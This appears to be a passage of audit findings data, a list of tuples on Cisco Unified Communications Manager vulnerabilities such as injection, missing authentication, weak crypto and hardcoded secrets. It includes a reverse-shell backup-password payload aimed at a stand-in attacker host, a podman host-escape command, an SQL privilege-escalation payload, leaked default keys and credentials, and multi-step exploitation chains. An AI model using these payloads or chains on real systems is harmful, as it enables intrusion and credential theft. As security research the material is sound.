        ("CUCM-F98", "CRITICAL","platform-survivability survivabilityNode_dkey_copy.sh replaceDkeyOnServivalNode(): chmod u=rw,go=r applied to dkey.txt + encrypted_Dkey.txt + oldkeys.txt at /usr/local/platform/.security/CCMEncryption/keys/; dkey.txt = plaintext database encryption Dkey; oldkeys.txt = all historical Dkeys (never pruned, appended on rotation); any local process reading dkey.txt bypasses F3's static-AES-key KEK step entirely; world-readable at file level (directory traversal permission needed for exploitation; CUCM's permissive posture makes it probable); chain: F3 (static AES key = alternative Dkey recovery, now second-order); F4 (Informix creds) + Dkey = full credential dump; F11 (inter-cluster passwords decryptable with Dkey)"),
        ("CUCM-F99", "HIGH",    "cm-ccmivr ccmivr.war: version=2.4 schema but uses Servlet 3.0 <http-method-omission>GET + POST omitted from deny-all <auth-constraint/>; same pattern as F87 (ccmportal.war) -- GET+POST exempted from container auth, leaving IVR PIN-lookup (IVRPinLookup/IVRCalleridLookup), enable/disable remote extension, PlaceCall, GetAudioFile all accessible without authentication; amplifies F37 (ccmivr SQLi via calledPartyNumber now confirmed pre-auth); version mismatch: Servlet 2.4 declared but Servlet 3.0 features used -- older strict parsers may collapse to full deny (more restrictive) or fully ignore omission elements (less restrictive); systemic: ccmportal + ccmivr = 2nd confirmed WAR with this pattern"),
        ("CUCM-F100", "CRITICAL","cm-usersync DNAliasSync_do_backup.py / DNAliasSync_do_restore.py: 4th independent DRF os.system() + sudo tar injection instance (systemic class F63/F67/F94/F100); 5 injection points all from sys.argv: DEVICE_TARBALL(arg4), LOGPATH(arg1), STATUSPATH(arg2), DEC_SEQ(arg6), ENC_SEQ(arg8); restore: command = DEVICE_TARBALL + DEC_SEQ + ' | sudo /bin/tar ...' = command-prefix injection -> root shell; STATUSPATH: os.system('echo ... > ' + STATUSPATH) = arbitrary root file write; systemic DRF framework defect confirmed across 4 separate CUCM components"),
        ("CUCM-F101", "HIGH",    "cm-webdialer webdialer.war Axis 1.x /services/* no container auth + hardcoded adminPassword=admin in server-config.wsdd; /services/* NOT covered by any security-constraint; WebdialerSoapService/Service70/Version accessible without container auth; globalConfiguration adminPassword=admin (Axis default unchanged); HTTPAuthHandler in transport extracts creds but no Authenticate handler in service requestFlow -> no actual validation; Version service returns Axis version without auth (fingerprinting); chain: F1 (Axis2 admin:axis2 in axl.war) + F101 (Axis 1.x adminPassword=admin) = systemic Axis default-cred pattern"),
        ("CUCM-F102", "CRITICAL","cm-userlookup DNAliasLookUp_do_backup.py / DNAliasLookUp_do_restore.py: 5th independent DRF os.system() + sudo tar injection instance (systemic class F63/F67/F94/F100/F102); LOGPATH(arg1), STATUSPATH(arg2), DEVICE_TARBALL(arg3), DEC_SEQ(arg6); restore: command = DEVICE_TARBALL + DEC_SEQ + ' | sudo /bin/tar -xvpPf - 2>> LOGPATH' = command-prefix injection -> root shell; STATUSPATH: os.system('echo 0 > ' + STATUSPATH) = arbitrary root file write to any path; 5th confirmed DRF framework template clone; chain: F63/F67/F94/F100 (same class) -- framework-level remediation required"),
        ("CUCM-F103", "HIGH",    "cm-lpns lpns.war (Servlet 4.0) ZERO <security-constraint> elements; only auth enforcement = AuthenticationFilter (application-level) mapped to /register/* only; all paths outside /register/* (unregister/, push delivery, status/health, admin) have NO container-level auth requirement; lpns handles Cisco Jabber + mobile push notification delivery; pre-auth access to push delivery endpoints -> push notification spoofing/poisoning to all Jabber/mobile clients; admin endpoints -> service manipulation; chain: F51 (UDS user enumeration) -> F103 (targeted pre-auth push attacks)"),
        ("CUCM-F104", "HIGH",    "ucm-ccmact ccmact.war production debug endpoints unauthenticated; web.xml comment explicitly reads 'These url's have no auth-constraint means everybody has access!'; /v1/tester/* -> Tester5XX: pre-loads error-response queue consumed by SRPHandshakeResource on ALL subsequent device activation requests -> unauthenticated DoS of phone onboarding via synthetic 5xx injection; /v1/testalarm/* -> TestAlarm: fires real CUCM alarms (DevActSSOSPServerRemoved/DevActCloudSyncFailure/DevActAccessTokenInvalid) without auth -> false alarm injection/alert fatigue; developer comment confirms intentional design; chain: F104 alarm injection covers F98 CCMEncryption key exfil activity"),
        ("CUCM-F105", "CRITICAL","platform-containers axl_container runs Struts 2.5.33 (struts2-core-2.5.33.jar); CVE-2023-50164 (S2-066) CVSS 9.8 file upload parameter pollution -> path traversal -> arbitrary file write = pre-auth RCE; AXL API port 9446 externally accessible in standard CUCM deployments; chain: F105 Struts RCE -> F106 (/opt/cisco/ R/W bind mount -> persistence) -> F107 (/usr/local/cm/.security/ via UDS pivot) -> full cluster key exfil"),
        ("CUCM-F106", "CRITICAL","platform-containers all 3 containers (axl/uds/ssosp) bind-mount /opt/cisco/:/opt/cisco/ R/W + cap_add DAC_OVERRIDE/SETUID/CHOWN; /opt/cisco/ = entire Cisco install tree; compromised container overwrites CUCM JARs/scripts that execute on host at next service restart; persistent backdoor survives container restart; chain: F105 (Struts RCE in AXL) -> overwrite /opt/cisco/cm/bin/*.py -> host root on CUCM service restart"),
        ("CUCM-F107", "CRITICAL","platform-containers uds_container ONLY bind-mounts /usr/local/cm/.security/:/usr/local/cm/.security/ with NO :ro flag + DAC_OVERRIDE/CHOWN/SETUID; contains TFTP provisioning keys, SRTP master keys, certificate private keys, ITL/CTL trust anchor material; UDS container compromise -> direct exfil + replacement of ALL CUCM security material; chain: F88 (ccmuser.war no auth) -> UDS shell -> F107 -> read ITL/CTL + SRTP keys -> F35 (CTL forge) + F84 (TFTP phone MitM)"),
        ("CUCM-F108", "HIGH",    "platform-containers all 3 containers cap_add SYS_PTRACE + network_mode:host; SYS_PTRACE allows compromised container to ptrace any process sharing user namespace; from axl_container ptrace uds_container JVM = dump in-flight Informix DB creds/session tokens/LDAP bind passwords/SAML assertions; chain: F105 (Struts RCE in AXL) -> F108 (ptrace UDS JVM) -> extract Informix creds -> F4 (direct Informix access)"),
        ("CUCM-F109", "HIGH",    "platform-containers /common/:/common/ R/W bind-mount in all 3 containers; docker_post.sh line 81: 'podman load -i /common/platform-docker/tomcat-common-image.tar' at every install/upgrade; compromised container overwrites tomcat-common-image.tar -> poisoned image loaded on next upgrade -> backdoor in all 3 containers post-upgrade; no image integrity verification; chain: any container foothold -> /common/ write -> upgrade-persistent backdoor"),
        ("CUCM-F110", "HIGH",    "platform-containers start_axl.sh + start_uds.sh deploy Tomcat Manager webapp at container startup (cp -R .../webapps/manager /opt/APACHE_TOMCAT/webapps/); Manager allows WAR upload = code execution; tomcat-users.xml symlinked from host; context.xml has allowLinking=true (symlink traversal from deployed WARs); default/weak Manager creds -> pre-auth RCE; chain: Manager -> deploy WAR -> F106 (/opt/cisco/ write -> host persistence)"),
        ("CUCM-F111", "CRITICAL","platform-docker docker_post.sh line 105: 'usermod -a -G dockerroot ccmservice'; ccmservice = CUCM platform service management account (DRF, daemon supervisor, CLI); dockerroot group = Podman daemon control without sudo; any process as ccmservice (DRF injection chains F63/F67/F94/F100/F102) -> 'podman run --privileged --pid=host --volume /:/mnt' = instant full host root; chain: F63/F67/F94/F100/F102 -> ccmservice shell -> F111 dockerroot -> host root + persistence"),
        ("CUCM-F112", "CRITICAL","ucfips-openssl CiscoSSL 1.0.2zd EOL (Jan 2020) shipped alongside 1.1.1t; 1.0.2 carries all unpatched post-EOL CVEs: CVE-2022-0778 (BN_mod_sqrt infinite loop DoS), CVE-2022-2274 (RSA heap corruption x86_64), CVE-2023-0464/0465/0466 (X.509 chain bypass), CVE-2023-2650 (ASN.1 infinite loop), CVE-2024-0727 (PKCS12 null deref); libssl.so.1.0.1/libcrypto.so.1.0.1 fully present and loaded via /etc/ld.so.conf.d/platform_libs.conf; 8+ years of unpatched CVEs in production library"),
        ("CUCM-F113", "HIGH",    "ucfips-openssl 'fips_post_corrupt' exported callable symbol at 0x7af00 in libcrypto.so.1.0.1 + cfom.so; intentionally corrupts FIPS Power-On Self-Test state flags; callable via dlsym() = artificial POST failure state disrupts FIPS enforcement; CISCOSSL_FOM_DIAG env var in both libcrypto.so.1.0.1 and cfom.so relaxes FIPS integrity checking when set before library load; FIPS FOM 6.2a from 2017-03-28 still present (9-year-old module); chain: any local process with LD_PRELOAD or env control -> FIPS bypass"),
        ("CUCM-F114", "HIGH",    "ucfips-openssl SSLv2 fully implemented (not stubs) in libssl.so.1.0.1: SSLv2_client_method/SSLv2_server_method/SSLv2_method/ssl2_accept/ssl2_connect all exported callable symbols; 'brc4a' Cisco proprietary RC4 variant in cfom.so (RFC 7465 prohibited); 3DES fully implemented in FIPS engine (cfom.so: cfom_des_ede3_*) NIST SP800-131A Rev2 prohibited post-2023; debug build (-DCRYPTO_MDEBUG/-DCONF_DEBUG/-DREF_CHECK/-g) shipped in production; TlsMinVersion.sh allows TLS 1.0 minimum with SSLv2Hello mode; default cipher string allows RC4 + 3DES"),
        ("CUCM-F115", "CRITICAL","platform-drf ciscoDrf.jar drfBackup.BuildScriptList(): this.sEncryption (web UI backup password) + this.sDevice + this.sRedirection all unsanitized in sScript string passed to drfLocalWorker sudo exec; platform_do_backup.py ENC_SEQ=sys.argv[8]=sEncryption in subprocess.call(shell=True) -> OS injection to root; attack: set backup password to 'a; bash -i &>/dev/tcp/ATTACKER/443 <&1 #' in DRF web UI -> root shell; framework-level root cause for F63/F67/F94/F100/F102 component scripts"),
        ("CUCM-F116", "CRITICAL","platform-drf ciscoDrf.jar drfAesEncrypter: AES-GCM with static all-zero 16-byte IV on every call (byte[] ivBytes = new byte[16]) = nonce reuse -> XOR keystream recovery, GHASH tag forgery; PBKDF2 salt hardcoded as sequential bytes 0x0102...0f10 (BCFIPS path) and -87,-121,-56,50,86,-91,-29,-78 (standard path) = rainbow tables applicable fleet-wide; all DRF-encrypted SFTP passwords + backup keys decryptable offline with precomputed dict; chain: F120 (platformConfig.xml 644 -> passphrase) + F116 = decrypt all drfDevice.xml credentials"),
        ("CUCM-F117", "HIGH",    "platform-drf ciscoDrf.jar drfLocalWorker + drfUtils: JSch.setConfig(StrictHostKeyChecking=no) global; non-FIPS cipher list includes 'none' (null cipher); MitM SFTP server -> receive complete backup archive (dkey.txt, all TLS keys, CAPF key, CTL) OR negotiate null cipher -> backup cleartext over wire; chain: F117 (SFTP MitM) -> F119 (archive contains dkey.txt) -> decrypt all CUCM DB passwords; OR F117 -> serve crafted restore -> F115 injection -> root"),
        ("CUCM-F118", "HIGH",    "platform-drf ciscoDrfSdk.jar drfUtils.isSecureMode(): returns false for standalone CUCM (getClusterSetup()=false); drfLocalAgent connects to MA port 4040 plaintext TCP; msgSubExecuteScript_REQ (script commands + SFTP creds + encryption password) transmitted unencrypted; network-adjacent attacker captures DRF creds or injects msgSubExecuteScript_REQ to trigger arbitrary script execution via framework"),
        ("CUCM-F119", "CRITICAL","platform-drf platform_do_backup.py: backup archive includes /usr/local/platform/.security/CCMEncryption/keys/dkey.txt + oldkeys.txt (complete Dkey history) + all TLS private keys (CallManager/TVS/Directory/CAPF/tomcat/ipsec) + CTL file + CAPF key + drfDevice.xml (SFTP passwords) + all trust store passphrases; single intercepted backup (F117 MitM) = complete cluster cryptographic compromise; no key material exclusion or separate encryption of private keys"),
        ("CUCM-F120", "HIGH",    "platform-drf ciscoDrf.jar drfEncrypter.fnGetKey(): reads IPSecSecurityPwCrypt from /usr/local/platform/conf/platformConfig.xml; upgrade_drf.sh sets chmod 644 on all platform conf XML files; any local process reads AES passphrase directly; chain: F120 (read passphrase) + F116 (static IV/salt) -> decrypt all drfDevice.xml SFTP passwords -> authenticate to all CUCM backup destinations"),
        ("CUCM-F121", "CRITICAL","cm-tvs bundleITLRecovery.sh: chmod 664 on /usr/local/cm/tftp/ITLRecovery.p12 (world-readable PKCS12 containing ITLRecovery_priv.pem + ITLRecovery.pem); PKCS12 password passed as '-password pass:$S_PWD' in openssl cmdline -> visible in /proc/PID/cmdline + echo to stdout/log; ITLRecovery private key = authority to sign ITL files for all phones; exfil ITLRecovery.p12 + recover password -> forge ITL -> redirect all phones to attacker CUCM; chain: F107 (UDS container /usr/local/cm/.security/ R/W) -> read ITLRecovery key"),
        ("CUCM-F122", "HIGH",    "cm-tvs tvs binary tvsSSLLibInit(): creates phone ssl_ctx without SSL_CTX_set_verify call; OpenSSL default = SSL_VERIFY_NONE; SSL_CTX_set_verify called exactly once in binary for outbound syslog connection (0x585fb) not for phone listener; any host reaching TVS port completes TLS without presenting certificate; any network-accessible attacker issues cert verification queries to TVS without authentication; chain: F122 (unauthenticated TVS) + F123 (DB hash lookup only) -> oracle for CUCM trusted certs"),
        ("CUCM-F123", "HIGH",    "cm-tvs tvs binary tvsHandleCertVerificationReq() -> getCertificateInformation() -> CertificateCache::getCertificateInformation(): no X509_verify / X509_STORE_CTX_init / X509_verify_cert / OCSP_sendreq_bio in cert verification code path; trust decision = DER hash lookup in Informix Certificate table; no chain validation, no validity period check, no CRL, no OCSP; write to CUCM Certificate table (via F3/F4 DB cred compromise or AXL API) -> insert attacker cert -> TVS vouches to all phones; chain: F4 (Informix creds) -> insert cert -> F123 vouches -> all phones trust attacker CUCM identity"),
        ("CUCM-F124", "HIGH",    "cm-soap2 all 5 SOAP2 WARs (CDRonDemandService2/controlcenterservice2/logcollectionservice2/perfmonservice2/realtimeservice2): Servlet 2.2 method enum gap - GET+POST auth-constrained, PATCH not listed in either constraint -> no container auth; transport-guarantee:NONE on all 5 -> HTTP Basic auth over non-TLS channel; admin credentials sniffable; extends F89 (AXL Servlet 2.2 gap) to full SOAP2 service family"),
        ("CUCM-F125", "HIGH",    "cm-capf nginx_update.sh: $certificate_enrollment_profile_label ($8) + $ca_decrypt_user ($7) injected unescaped into sudo /bin/sed -i replacement strings; GNU sed \\n in replacement injects newlines -> arbitrary nginx.conf directives as root; CA username+password written as plaintext to CACredentials.txt (echo $4 > cred_file; echo $5) before CCMEncryption step"),
        ("CUCM-F126", "CRITICAL","cm-authentication IMS.jar CUCMUtil.getHostName(): \"select name from processnode where nodeid=\" + nodeId (string concatenation, no PreparedStatement); nodeId from OAuth token -> pre-auth SQL injection into CUCM Informix DB; chain: OAuth endpoint -> SQLi -> SELECT credential FROM applicationuser -> decrypt with F3 static key smetsysocsiccni -> admin auth -> F1 (axl.war admin:axis2) -> RCE"),
        ("CUCM-F127", "CRITICAL","platform-snmp mgr.cnf: SNMPv3 root user with hardcoded authKey=authpass privKey=privpass (MD5+DES) identical all deployments; SNMPv3 public user usmNoAuthProtocol/usmNoPrivProtocol = anonymous; naa.cnf: readcomm=writecomm=ccmadmincommunity; VACM WriteView=iso (full MIB) for SNMPv1/v2c noAuthNoPriv; systemic SNMP credential failure across all three SNMP protocol versions"),
        ("CUCM-F128", "HIGH",    "cm-authentication IMS.jar AuthenticationDB.authenticateUser(): SHA-1 password hashing (MessageDigest.getInstance(SHA-1)); String.equals() comparison short-circuits on first byte mismatch (not MessageDigest.isEqual()); SHA-1 GPU crackable + remote timing oracle for password inference; affects all end-user CUCM password authentication"),
        ("CUCM-F129", "CRITICAL","cm-changecredential changecredential.war: Trust-All X509TrustManager (checkServerTrusted/checkClientTrusted = return) + HostnameVerifier.verify=true unconditional; ZERO <security-constraint> in web.xml (Servlet 2.2); CredentialChange.dtd example: appCertificate=password for 7960LoginApp; if shipped as default -> pre-auth PIN change for any CUCM user; all outbound HTTPS connections MITMable (no cert/hostname check)"),
        ("CUCM-F130", "HIGH",    "platform-remotesupport remotesupport_createaccount: hardcoded RSA-2048 public key (Cisco TAC private key) embedded in binary at known offsets; same key across all CUCM 15.0.1.x; key compromise = systemic remote support passphrase decrypt; sudo /usr/bin/script -fq /var/log/.../remote_activity.log* trailing * = sudo argument glob -> path traversal to arbitrary file (e.g., /etc/cron.d/)"),
        ("CUCM-F131", "HIGH",    "platform-ipsec IPSecClient.class: raw java.net.Socket to port 8500, no TLS, no auth; any local process sends CREATE command to IPSec manager; IPSecManagerImpl XMLUtils.getDocumentBuilderFactory() missing setFeature(external-general-entities,false) and disallow-doctype-decl -> XXE on ipsec.xml (runtime-populated from network/admin sources)"),
        ("CUCM-F132", "CRITICAL","cm-dbl do_backup.py 6th DRF injection: deviceTarball=sys.argv[4] + ENC_SEQ=sys.argv[8] + redirection=sys.argv[5] unsanitized in executeWithRCSecured('sudo /bin/tar ... '+deviceTarball+' ... '+ENC_SEQ); executeWithRCSecured uses subprocess.call(['sh','-c',cmd],shell=False) -> sh -c interprets payload; backup manifest includes /home/informix/.rhosts (RSH trust file); exfil chain (F116+F117+F120) leaks .rhosts -> RSH to informix -> DB shell"),
        ("CUCM-F133", "HIGH",    "cm-dbl db/sql/ccmusers.sql: 'create user ccmuser with encrypted password \\'ccmuser\\'' - username==password; ccmusers group holds ALL PRIVILEGES on all 140+ CUCM Informix tables including ApplicationUser/EndUser/Device/ProcessNode; EXECUTE on sp_authenticate; combined with F4 (Informix port 1526) = confirmed credential pair ccmuser:ccmuser for full CUCM DB read/write"),
        ("CUCM-F134", "CRITICAL","cm-cdrrep do_cdrcar_backup.py/do_cdrcar_restore.py: 7th DRF injection; backup: deviceTarball=sys.argv[4]+ENC_SEQ=sys.argv[8]+redirection=sys.argv[5] in sudo tar cmd; restore: deviceTarball=sys.argv[3] occupies command slot before pipe ('%s %s | sudo /bin/tar ...' % (deviceTarball,DEC_SEQ)) -> deviceTarball executed as process before pipe; executeWithRCSecured suppresses command from logs ('Do not print command as it has encryption info')"),
        ("CUCM-F135", "HIGH",    "cm-CTI CTIManager binary: hardcoded 'DSN=ccm2;UID=dbims' string - dbims is DBA-level Informix account for CCM schema; adjacent debug stub 'XXXXXX Check 1' in production binary; confirms two independent Informix auth paths (ccmuser F133, dbims F135); debug strings confirm non-stripped debug build shipped"),
        ("CUCM-F136", "HIGH",    "cm-cdrdlv cdrdlv.jar ServiceParameter.class: 'select * from billingserver' -> hex-decode -> CCMEncryption.decryptPassword() (same F3 static key) -> plaintext FTP/SFTP passwords in ServiceParameter$BillingServerInfo.spPasswd String heap; debug log ' password (before desrypting:' typo in production; billing servers receive all CDR records; chain: F4+F133 -> billingserver table -> offline decrypt -> billing FTP pivot"),
        ("CUCM-F137", "HIGH",    "cm-cdrdlv cdrdlv.jar SFTPConnection.class: non-FIPS cipher preference = 'aes256-ctr,aes128-ctr,none,aes192-ctr' (none present); FIPS = 'aes256-ctr,aes128-ctr,aes192-ctr' (no none); most CUCM deployments non-FIPS; if billing server SFTP peer accepts none -> SSH transport unencrypted -> CDR records (call metadata: src/dst/timestamps/duration) transmitted cleartext over TCP/22"),
        ("CUCM-F138", "LOW",     "cm-cdrrep/cdrdlv cdrScript.py/cdragntScript.py: LD_LIBRARY_PATH = os.getenv('SD_LIB_PATH') + ':/usr/...'; exportStr = 'export LD_LIBRARY_PATH=' + LD_LIBRARY_PATH; os.system(exportStr) - SD_LIB_PATH unsanitized; if SD_LIB_PATH unset os.getenv returns None -> TypeError crashes service start script (DoS); export runs in subshell so env poisoning low-impact standalone"),
        ("CUCM-F139", "CRITICAL","sso-sp FederationConfig.properties: am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2 (OpenSSO/OpenAM default encryption key, publicly known from OSS codebase); JCEEncryption uses this key for all federation config sensitive value encryption (LDAP passwords, keystore passphrases); identical across all CUCM 15.0.1.x deployments; offline decrypt trivial"),
        ("CUCM-F140", "CRITICAL","sso-sp ssoconfig.properties: metadata_assertion_signed=false + metadata_auth_request_signed=false + sp_md_signed=false; SAMLAuthenticator.class only calls Assertion.isTimeValid() after processResponseForFedlet() - no signature verification; forged unsigned SAML assertion POST to /ssosp/saml/SSO/alias/<spEntityId> sets USERNAME session attr to attacker-controlled value -> SAMLAuthValve materializes Principal for ccmadministrator -> full access to ccmadmin/ccmservice/cucreports/ucmuser/webdialer/cuadmin/callqueue"),
        ("CUCM-F141", "HIGH",    "sso-sp SAMLAuthValve.class: reads org.apache.catalina.session.USERNAME from session; calls Realm.authenticate(username,'') (ldc #28=''); SSO realm accepts any username with empty password (assertion is credential); if F140 exploited (forged assertion sets attacker username in session) -> SAMLAuthValve materializes Principal with no DB lookup, no password check, no expiry; bridge between forged assertion and live authenticated Principal"),
        ("CUCM-F142", "HIGH",    "sso-sp SPCache.class (openam-federation-library-14.0.0-M6.jar): authnRequestHash and assertionByIDCache are PeriodicCleanUpMap (in-memory per-node); no cluster-wide shared cache; ssoclustermanagerapi handles metadata not replay state; CUCM 2-8 node clusters -> assertion replayed to second node within NotOnOrAfter window succeeds; intercepted valid assertion replayable fleet-wide"),
        ("CUCM-F143", "HIGH",    "sso-sp RelayToOriginalAppServlet.class: relay URL 'validation' = relayUrl.toLowerCase().contains('http'); any absolute URL (https://evil.com) passes; response.sendRedirect(relayUrl) follows; RelayState arrives via SAML POST parameter; ValidateFilter regex protects only /pages/userconfirmation.jsp redirectUrl, not relay servlet; phishing chain via IdP-initiated SSO link"),
        ("CUCM-F144", "HIGH",    "sso-sp ssosp.war JAR manifests: opensaml.jar 2.6.5 (EOL 2016, Build-Jdk: 1.7.0_71); xmlsec-1.5.6.jar Apache Santuario ~2014; openam-federation-library-14.0.0-M6 pre-release; xalan-2.7.1.jar bundled - Xalan 2.7.1 XSLT injection when processing attacker-controlled XML with xsl:* namespace extensions in SAML assertion"),
        ("CUCM-F145", "MEDIUM",  "sso-sp SAMLAuthValve.class: Security.setProperty('org.bouncycastle.rsa.allow_multi_use','true') called globally (not thread-local) before every processResponseForFedlet() invocation; relaxes BC RSA key-type enforcement JVM-wide; IdP RSA key dual-use (sign+encrypt) enables key confusion; concurrent Tomcat threads all share single mutated security property"),
        ("CUCM-F146", "MEDIUM",  "sso-sp FederationConfig.properties: com.sun.identity.saml.xmlsig.keystore=/usr/local/platform/.security/tomcat/certs/tomcat.keystore (Tomcat TLS key used as SAML SP signing+encryption key); saml.signing.cert.alias=tomcat; saml.signing.cert.alias.2=ITLRecovery (ITLRecovery key from F121 wired as secondary SAML signing alias); keystore passphrase at /usr/local/platform/.security/tomcat/keys/tomcat.passphrase (plaintext file)"),
        ("CUCM-F147", "MEDIUM",  "sso-sp SPACSUtils.class: InResponseTo retrieved at bytecode offset 2163 but validated only in SP-initiated flow (prior AuthnRequest ID in SPCache.authnRequestHash); IdP-initiated assertions (no prior request) -> InResponseTo unchecked; combined with F140 -> POST arbitrary IdP-initiated assertion with any subject; even with signature enforcement IdP-initiated flows accept injection from any signing entity"),
        ("CUCM-F148", "LOW",     "sso-sp SamlFilter.class: if queryString.contains('TestSSO.jsp') -> chain.doFilter() bypass without SSO check; any URL with TestSSO.jsp substring in query string bypasses SamlFilter auth gate; TestSSO.jsp diagnostic page exposed via bypass leaks SSO configuration details"),
        ("CUCM-F149", "CRITICAL","cm-axl axl.war ExecuteSqlHandler.class doExecute(): ConnectorPub.createStatement() returns plain java.sql.Statement (not PreparedStatement); raw SQL from SOAP directly to Statement.executeQuery(String); AXLSoap.xsd sql element=xsd:string no restriction; executeSQLQueryInactive same pattern targets standby replica; chain: F1 (axis2:axis2) -> deploy AAR bypasses AXL role -> unrestricted SQL dump: SELECT userid,credential,salt FROM enduser; decrypt with F3 -> plaintext admin passwords"),
        ("CUCM-F150", "HIGH",    "cm-axl axl.war ExecuteSqlHandler.class doExecuteUpdate(): 4-step permission bypass: (1) whitespace strip converts 'enduser SET' -> 'enduserSET' making table detection regex 'enduser[\\s(]' fail; (2) empty tableName -> validatePermission() skipped; (3) execution uses original unstripped SQL; (4) validatePermission's own '\\bwhere\\s+' regex also fails post-normalization; payload: UPDATE enduser SET userrank=1 WHERE userid='self' -> admin self-promotion with only Standard AXL API Access"),
        ("CUCM-F151", "HIGH",    "axlsqltoolkit.zip client/DotNet/Main.cs (customer-distributed plugin): hardcoded ccmIp=10.77.31.219, user=CCMAdministrator, password=219_axl; password pattern derives from host IP octet (.219 -> 219_axl); CCMAdministrator = CUCM superadmin; customers who used sample as template may have deployed with this credential pattern"),
        ("CUCM-F152", "HIGH",    "cm-axl axl.war web.xml: AxisAdminServlet mapped at /axl/axis2-admin/* (extends F1 to AXL WAR context); transport-guarantee:NONE -> HTTP Basic auth for admin:axis2 travels cleartext; Tomcat HTTP on 8080 active -> passive voice VLAN capture of axis2 admin creds -> AAR upload -> RCE"),
        ("CUCM-F153", "MEDIUM",  "cm-axl axl.war META-INF/context.xml: both CCMRealm and CCMRealmPlugin commented out ('this is temporary until our Realm is defined' - comment shipped in production); auth delegated entirely to BasicAuthenticationValve; no container-level Realm fallback if valve role validation has bypass"),
        ("CUCM-F154", "HIGH",    "cm-axl pktCap.war pktCap_jsp.class offset 763-776: request.getParameter('key') appended to Runtime.exec(String) as -k arg for pktCap_protectData binary; pktCap_protectData internally snprintf(cmdLine,...,keyName) + system(cmdLine) + popen(); checkForHarmfulMetaChars function exists but char set unknown; if bypass possible: shell injection via key param; transport-guarantee:NONE; requires Standard Packet Sniffing role"),
        ("CUCM-F155", "MEDIUM",  "cm-axl cisco-ccm-realm.jar SeadragonUserDAO.class: 'SELECT EndUser.pkid,...FROM EndUser WHERE my_lower(EndUser.userid)=my_lower(\\'\\'{0}\\'\\'') built via MessageFormat.format(pattern,userid); FastAccessLocal.selectCustom(sql) executes result; MessageFormat does not SQL-escape; Informix injection via my_lower() side effects or format specifier abuse possible"),
        ("CUCM-F156", "LOW",     "cm-ccm /common/spy.py GDB Python helper in production RPM: IMDB='CCMDB' (Informix DB name), dereference_smartptr=True, maps internal SDL/STLP data structures; post-exploitation: provides GDB automation for live CCM process memory extraction; confirms debug/non-stripped builds shipped"),
        ("CUCM-F157", "HIGH",    "cm-ccm /usr/local/cm/bin/CCMEncryptionTest: '-k -1' flag accesses old static hardcoded key compiled into binary; key storage at /usr/local/platform/.security/CCMEncryption/keys/dkey.txt + oldkeys.txt + dkey_status.txt; combined with F98 (dkey.txt world-readable): full CCMEncryption key chain exfiltrable; old static key decrypts all legacy CUCM-encrypted credentials"),
        ("CUCM-F158", "HIGH",    "cm-asymenc CCMAsymmetricEncryption.class getIvDataBytes(): 'bipush 16; newarray byte' allocates zero-filled 16-byte array, wraps directly in IvParameterSpec with no randomization; encryptText_symmetric() calls this for every AES/CBC op -> IV always \\x00*16; same plaintext prefix -> identical ciphertext prefix; same static-IV class as F115 (DRF AES-GCM) but in asymmetric encryption subsystem"),
        ("CUCM-F159", "HIGH",    "cm-asymenc CCMAsymmetricEncryption.class rsaAsymPubEnc(): variable name constant #154='rsaOAEPEncrypter' (dev intended OAEP) but actual algorithm constant #9='RSA/ECB/PKCS1PADDING'; both FIPS and non-FIPS paths use PKCS1 v1.5; ROBOT-eligible Bleichenbacher oracle if timing/error distinction available in decryption path"),
        ("CUCM-F160", "MEDIUM",  "cm-asymenc CCMAsymmetricEncryption.class rsaAsymPubEnc() non-FIPS branch (isSecure=false): SecureRandom.getInstance('SHA1PRNG') offsets 90-93; FIPS branch: SecureRandom.getInstance('DEFAULT','BCFIPS'); SHA1PRNG NIST-deprecated SP 800-131A; most CUCM deployments non-FIPS -> weaker RSA key generation entropy"),
        ("CUCM-F161", "HIGH",    "cm-asymenc CCMAsymmetricEncryptionSecurityManager.class initializeSecurityProviders(): new BouncyCastle FipsProvider('C:HYBRID;ENABLE{All}'); HYBRID mode allows non-FIPS algorithms when approved alternative unavailable; ENABLE{All} permits all non-approved algorithm families; FIPS mode is nominal only - RSA-PKCS1/SHA1PRNG/3DES/RC4 all executable under BCFIPS label"),
        ("CUCM-F162", "CRITICAL","cm-asymenc CCMAsymmetricEncryption.class generateKey(): new SecureRandom() + nextBytes(byte[16]) OK; new String(rawBytes) BAD - platform default charset UTF-8 replaces invalid byte sequences with U+FFFD or drops bytes; ~30-40% of 16-byte sequences corrupt on UTF-8 round-trip; effective AES-128 key space <<2^128; multiple distinct inputs map to same corrupted key -> birthday attacks feasible at reduced cost"),
        ("CUCM-F163", "HIGH",    "cm-authentication AuthenticationLDAP.class makeConnection(): env.put('java.naming.referral','follow') hardcoded offsets 125-127; LDAP bind DN+password added to SAME env hashtable offsets 438-467; per JNDI spec referral=follow forwards full env (including SECURITY_CREDENTIALS) to referred server; MITM/compromised upstream LDAP returns referral to attacker server -> CUCM sends bind DN+password to attacker without re-prompting"),
        ("CUCM-F164", "MEDIUM",  "cm-capf EnrollmentService.sh CreateConfigFile(): echo 'msca-user-id=$CA_UserName' > ciscoRA_config_file; echo 'msca-password=$CA_Pwd' >> ciscoRA_config_file; nginx -I --config-file-rm reads+deletes; no chmod before nginx reads; race window between echo writes and --config-file-rm deletion -> any process reading .security/CAPF/ captures plaintext MSCA credentials; 3rd CAPF credential plaintext-write instance (distinct from F82/F125)"),
        ("CUCM-F165", "HIGH",    "cm-authentication IMS.jar AuthenticationDB.class authenticateUser(): primary=HmacSHA512 with DKey; fallback when DKey unavailable='authenticateUser: defaulting to not using salt' -> SHA-1 unsalted (const pool 'SHA-1' #91); AltHash1/AltHash2 fields in CredentialDetails: auth succeeds if primaryHash OR AltHash1 OR AltHash2 matches; log 'Matches the alternate hash value'; write known AltHash to DB (via F126 SQLi or F149 AXL) -> any account backdoored with chosen password"),
        ("CUCM-F166", "HIGH",    "cm-authentication IMS.jar AuthenticationDB.class: log string 'authenticateUser: Encrypted password found. Decrypting...'; methods getApplicationCredential()/getEncryptedApplicationCredential()/decryptPassword() present; APP user credentials reversibly encrypted (not hashed) via CCMEncryption.decryptPassword(); DKey from /usr/local/platform/.security/CCMEncryption/keys/dkey.txt (F98 world-readable) -> ALL app user passwords decrypt to plaintext; app users = CRM/CDR/LDAP/billing/Unity integration accounts -> cascade to connected infra"),
